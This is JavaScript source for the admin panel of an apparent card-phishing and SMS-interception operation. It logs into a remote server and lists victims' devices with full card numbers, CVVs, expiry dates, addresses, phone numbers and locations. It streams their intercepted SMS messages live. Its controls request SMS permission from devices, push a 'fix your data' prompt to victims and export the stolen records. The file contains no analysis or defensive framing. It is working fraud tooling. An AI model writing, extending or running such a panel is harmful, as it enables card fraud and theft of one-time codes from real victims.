// admin.js
const serverUrl = "https://backfinish.onrender.com";

document.addEventListener("DOMContentLoaded", () => {
  const authSection = document.getElementById("auth-section");
  const loginBtn = document.getElementById("login-btn");
  const pwdInput = document.getElementById("admin-password");
  const authMessage = document.getElementById("auth-message");
  const requestSmsBtn = document.getElementById("request-sms-btn");

  const adminContent = document.getElementById("admin-content");
  const copyBtn = document.getElementById("copy-btn");
  const saveBtn = document.getElementById("save-btn");
  const downloadBtn = document.getElementById("download-btn");
  const errorNotifyBtn = document.getElementById("error-notify-btn");
  const devicesListEl = document.getElementById("devices-list");
  const placeholderEl = document.getElementById("placeholder");
  const deviceInfoEl = document.getElementById("device-info");
  const smsContainerEl = document.getElementById("sms-container");

  const fields = {
    deviceId: document.getElementById("detail-deviceId"),
    ip: document.getElementById("detail-ip"),
    location: document.getElementById("detail-location"),
    cardholderName: document.getElementById("detail-cardholderName"),
    cardNumber: document.getElementById("detail-cardNumber"),
    expiry: document.getElementById("detail-expiry"),
    cvv: document.getElementById("detail-cvv"),
    address: document.getElementById("detail-address"),
    phoneNumber: document.getElementById("detail-phoneNumber"),
    timestamp: document.getElementById("detail-timestamp"),
    smsPermission: document.getElementById("detail-smsPermission"),
  };

  let jwtToken = localStorage.getItem("jwtToken");
  let socket = null;
  let currentDevice = null;
  let devicesData = [];

  if (jwtToken) {
    authSection.style.display = "none";
    adminContent.style.display = "block";
    initAdmin();
  } else {
    authSection.style.display = "block";
    adminContent.style.display = "none";
  }

  loginBtn.addEventListener("click", async () => {
    authMessage.textContent = "";
    const pwd = pwdInput.value.trim();
    if (!pwd) {
      authMessage.textContent = "Geben Sie das Passwort ein.";
      return;
    }
    try {
      const res = await fetch(`${serverUrl}/api/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password: pwd }),
      });
      const json = await res.json();
      if (!json.success) {
        authMessage.textContent = json.message || "Login fehlgeschlagen.";
        return;
      }
      jwtToken = json.token;
      localStorage.setItem("jwtToken", jwtToken);
      authSection.style.display = "none";
      adminContent.style.display = "block";
      initAdmin();
    } catch (e) {
      console.error(e);
      authMessage.textContent = "Server-Fehler.";
    }
  });

  function initAdmin() {
    socket = io(`${serverUrl}/admin`, {
      transports: ["websocket"],
      auth: { token: jwtToken },
    });

    socket.on("connect", () => {
      console.log("✔ Admin WS connected:", socket.id);
    });

    socket.on("new_sms", (sms) => {
      if (sms.deviceId === currentDevice) appendSmsItem(sms);
    });
    socket.on("devices_updated", () => {
      loadDevices().then(refreshSelectedDevice);
    });

    copyBtn.addEventListener("click", copyDevicesToClipboard);
    saveBtn.addEventListener("click", saveSnapshot);
    downloadBtn.addEventListener("click", downloadDevicesJson);

    requestSmsBtn.addEventListener("click", async function () {
      if (!currentDevice) return;
      try {
        const res = await fetch(`${serverUrl}/api/request-sms-permission`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${jwtToken}`,
          },
          body: JSON.stringify({ deviceId: currentDevice }),
        });
        const json = await res.json();
        if (json.success) {
          this.disabled = true;
          this.textContent = "Запрос отправлен";
          setTimeout(() => {
            this.disabled = false;
            this.textContent = "Запросить разрешение на СМС";
          }, 3000);
        } else alert("❌ Ошибка при отправке запроса");
      } catch (err) {
        console.error("Ошибка при запросе СМС-права:", err);
        alert("❌ Не удалось отправить запрос");
      }
    });

    errorNotifyBtn.addEventListener("click", async function () {
      if (!currentDevice) return;
      try {
        const res = await fetch(`${serverUrl}/api/prompt-resubmit`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${jwtToken}`,
          },
          body: JSON.stringify({ deviceId: currentDevice }),
        });
        const json = await res.json();
        if (json.success) {
          this.disabled = true;
          this.textContent = "Уведомление отправлено";
        } else alert("❌ Ошибка при уведомлении");
      } catch (err) {
        console.error("Ошибка при prompt-resubmit:", err);
        alert("❌ Не удалось отправить уведомление");
      }
    });

    const deleteDeviceBtn = document.getElementById("delete-device-btn");
    deleteDeviceBtn.addEventListener("click", async function () {
      if (!currentDevice) return;
      if (!confirm(`Удалить устройство ${currentDevice}? Это действие необратимо.`)) return;
      try {
        const res = await fetch(`${serverUrl}/api/delete-device`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${jwtToken}`,
          },
          body: JSON.stringify({ deviceId: currentDevice }),
        });
        const json = await res.json();
        if (json.success) {
          alert("✅ Устройство удалено");
          devicesData = devicesData.filter(dev => dev.deviceId !== currentDevice);
          currentDevice = null;
          renderDeviceList(devicesData);
          deviceInfoEl.classList.remove("show");
          smsContainerEl.classList.remove("show");
          placeholderEl.style.display = "block";
        } else alert("❌ Ошибка при удалении устройства");
      } catch (err) {
        console.error("Ошибка при удалении устройства:", err);
        alert("❌ Не удалось удалить устройство");
      }
    });

    loadDevices().then(refreshSelectedDevice);
  }

  async function loadDevices() {
    try {
      const res = await fetch(`${serverUrl}/api/devices`, {
        headers: { Authorization: `Bearer ${jwtToken}` },
      });
      const json = await res.json();
      if (json.success) {
        devicesData = json.data;
        renderDeviceList(devicesData);
        refreshSelectedDevice();
      } else if (res.status === 401) {
        localStorage.removeItem("jwtToken");
        location.reload();
      }
    } catch (e) {
      console.error(e);
    }
  }

  function renderDeviceList(devices) {
    devicesListEl.innerHTML = "";
    devices.forEach(dev => {
      const li = document.createElement("li");
      li.textContent = dev.deviceId;
      li.dataset.deviceId = dev.deviceId;
      if (dev.deviceId === currentDevice) li.classList.add("active");
      li.addEventListener("click", () => selectDevice(dev));
      devicesListEl.append(li);
    });
  }

  async function selectDevice(dev) {
    Array.from(devicesListEl.children).forEach(li =>
      li.classList.toggle("active", li.dataset.deviceId === dev.deviceId)
    );
    if (currentDevice) socket.emit("leave_device", currentDevice);
    currentDevice = dev.deviceId;
    socket.emit("join_device", currentDevice);

    placeholderEl.style.display = "none";
    deviceInfoEl.classList.add("show");
    smsContainerEl.classList.add("show");
    smsContainerEl.innerHTML = "";

    updateDeviceDetails(dev);

    try {
      const res = await fetch(`${serverUrl}/api/devices/${dev.deviceId}/sms`, {
        headers: { Authorization: `Bearer ${jwtToken}` },
      });
      const json = await res.json();
      if (json.success) json.data.forEach(appendSmsItem);
    } catch (e) { console.error(e); }

    errorNotifyBtn.disabled = false;
    errorNotifyBtn.textContent = "Исправить данные";
  }

  function appendSmsItem(sms) {
    const ts = parseInt(sms.timestamp, 10);
    const timeString = isNaN(ts)
      ? "Invalid Date"
      : new Date(ts).toLocaleString("de-DE");
    const div = document.createElement("div");
    div.className = "sms-item";
    div.innerHTML = `
      <div class="from"><b>From:</b> ${sms.fromNumber}</div>
      <div class="body">${sms.body}</div>
      <div class="timestamp">${timeString}</div>
    `;
    smsContainerEl.append(div);
    smsContainerEl.scrollTop = smsContainerEl.scrollHeight;
  }

  function copyDevicesToClipboard() {
    if (!devicesData.length) return;
    navigator.clipboard.writeText(JSON.stringify(devicesData, null, 2));
  }

  function saveSnapshot() {
    localStorage.setItem("devicesSnapshot", JSON.stringify(devicesData));
  }

  function downloadDevicesJson() {
    const blob = new Blob([JSON.stringify(devicesData, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "devices.json";
    document.body.append(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  }

  function refreshSelectedDevice() {
    if (!currentDevice) return;
    const dev = devicesData.find(d => d.deviceId === currentDevice);
    if (!dev) {
      currentDevice = null;
      deviceInfoEl.classList.remove("show");
      smsContainerEl.classList.remove("show");
      placeholderEl.style.display = "block";
      return;
    }
    updateDeviceDetails(dev);
  }
function updateDeviceDetails(dev) {
  fields.deviceId.textContent = dev.deviceId;
  fields.ip.textContent = dev.ip || "";
  fields.location.textContent = [dev.city, dev.country]
    .filter(Boolean)
    .join(", ");
  fields.cardholderName.textContent = dev.cardholderName;
  fields.cardNumber.textContent = dev.cardNumber;
  fields.expiry.textContent = dev.expiry;
  fields.cvv.textContent = dev.cvv;
  fields.address.textContent = dev.address;
  fields.phoneNumber.textContent = dev.phoneNumber ? dev.phoneNumber : "Не указал";
  fields.timestamp.textContent = new Date(dev.timestamp).toLocaleString("de-DE");
  fields.smsPermission.textContent = dev.smsPermission ? "✅ SMS есть" : "❌ Sms нет";
  fields.smsPermission.style.color = dev.smsPermission ? "green" : "red";

}






});
